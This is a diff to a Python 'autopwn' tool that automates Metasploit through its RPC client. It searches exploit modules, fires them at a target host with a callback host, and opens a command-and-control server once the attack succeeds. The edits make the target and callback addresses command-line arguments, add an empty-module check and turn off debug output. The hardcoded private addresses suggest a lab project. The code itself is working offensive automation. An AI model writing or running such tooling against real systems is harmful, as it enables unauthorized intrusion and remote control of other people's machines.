@@ -39,7 +39,7 @@ LOG("Launched autopwn.", logfile, "inf")
 IP = "192.168.1.45"
 EXPLOIT_LIST = "./exploit_list"
 
-debug = 1
+debug = 0
 
 
 def show_pwnguin():
@@ -180,7 +180,6 @@ def runMetasploit(reinit=False, show=True) -> MsfRpcClient:
 
 def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
     modules = client.modules.search(attack)
-
     print("[~] Available modules :")
     for k in range(len(modules)):
         pprint.pprint(
@@ -206,6 +205,10 @@ def selectPayloadMS(client: MsfRpcClient, payload_fullname: str) -> PayloadModul
 
 def exploitVuln(Rhosts="192.168.1.45", Lhost="192.168.1.37", auto_mode=False, client=None, modlist=[]) -> None:
     """Execute selected payload on the targeted"""
+    if (modlist == []) : 
+        LOG("Error 8 : Module error.", logfile, "err")
+        print("[X] Error 8 : Module error, no module.")
+        exit(-8)
     exploit = client.modules.use(modlist[0]["type"], modlist[0]["fullname"])
     print("[V] Selected payloads: ", exploit.info)
 
@@ -375,8 +378,8 @@ def autopwn(Rhosts="192.168.1.45",
         LOG("Entered in C&C section", logfile, "inf")
 
         print("[~] Opening local C2 server ...")
-        (proc, port) = postexploit.openCtrlSrv("192.168.1.37")
-        ipport = "http://192.168.1.37:" + str(port)
+        (proc, port) = postexploit.openCtrlSrv(Lhost)
+        ipport = "http://" +Lhost + ":" + str(port)
     else:
         ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
     print("[V] Pwn complete !!! ")
@@ -393,7 +396,8 @@ if __name__ == "__main__":
 
 
     flushProcesses()
-    
+    Rhosts="192.168.1.45"
+    Lhost="192.168.1.37"
     
     if len(sys.argv) > 1:
         IP = sys.argv[1]
@@ -402,7 +406,7 @@ if __name__ == "__main__":
             Lhost = sys.argv[2]
 
     (shell, client, srv) = autopwn(
-        Rhosts="192.168.1.45",Lhost="192.168.1.37",generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=True
+        Rhosts=Rhosts,Lhost=Lhost,generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=True
     )
 
     sequence = [
